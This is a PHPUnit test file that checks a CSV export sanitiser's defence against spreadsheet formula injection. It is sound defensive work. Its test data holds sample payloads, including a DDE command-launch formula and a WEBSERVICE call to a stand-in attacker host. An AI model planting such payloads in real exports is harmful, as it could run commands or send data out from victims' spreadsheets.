<?php

declare(strict_types=1);

namespace Stride\Tests\Unit;

use Stride\Admin\AdminExportService;
use Stride\Modules\Enrollment\RegistrationRepository;
use Stride\Modules\Invoicing\QuoteRepository;
use Stride\Tests\TestCase;

/**
 * Unit tests for AdminExportService::sanitizeCsvCell — the CSV / spreadsheet
 * formula-injection neutraliser.
 *
 * This control moved VERBATIM from AdminAPIController::sanitizeCsvCell into the
 * export read-model service (Task D3 strangle). The full injection-vector matrix
 * (relocated from AdminAPIControllerTest) is the security-regression net: any cell
 * whose first char is =/+/-/@/TAB/CR must be prefixed with a single quote so a
 * spreadsheet treats it as a literal string. The control is now a PUBLIC method
 * (invoked per-cell by the controller while streaming) — no reflection needed.
 *
 * Run: ddev exec vendor/bin/phpunit --filter AdminExportService --testsuite Unit
 */
class AdminExportServiceTest extends TestCase
{
    private AdminExportService $service;

    protected function setUp(): void
    {
        parent::setUp();

        // sanitizeCsvCell is pure string logic — it touches neither repository,
        // so mocked collaborators satisfy the constructor.
        $this->service = new AdminExportService(
            $this->createMock(RegistrationRepository::class),
            $this->createMock(QuoteRepository::class),
        );
    }

    /**
     * @test
     * @dataProvider csvInjectionVectors
     */
    public function sanitizeCsvCellPrefixesFormulaTriggers(string $input, string $expected): void
    {
        $this->assertSame($expected, $this->service->sanitizeCsvCell($input));
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function csvInjectionVectors(): array
    {
        return [
            'equals'        => ['=cmd|\'/C calc\'!A1', "'=cmd|'/C calc'!A1"],
            'webservice'    => ['=WEBSERVICE("http://evil.test")', "'=WEBSERVICE(\"http://evil.test\")"],
            'plus'          => ['+1+1', "'+1+1"],
            'minus'         => ['-2+3', "'-2+3"],
            'at'            => ['@SUM(A1)', "'@SUM(A1)"],
            'tab'           => ["\t=1", "'\t=1"],
            'carriage'      => ["\r=1", "'\r=1"],
            'safe_name'     => ['Jan Janssens', 'Jan Janssens'],
            'safe_email'    => ['user@example.test', 'user@example.test'],
            'empty'         => ['', ''],
            'numeric_safe'  => ['12345', '12345'],
            'leading_space' => [' =1', ' =1'],
        ];
    }
}
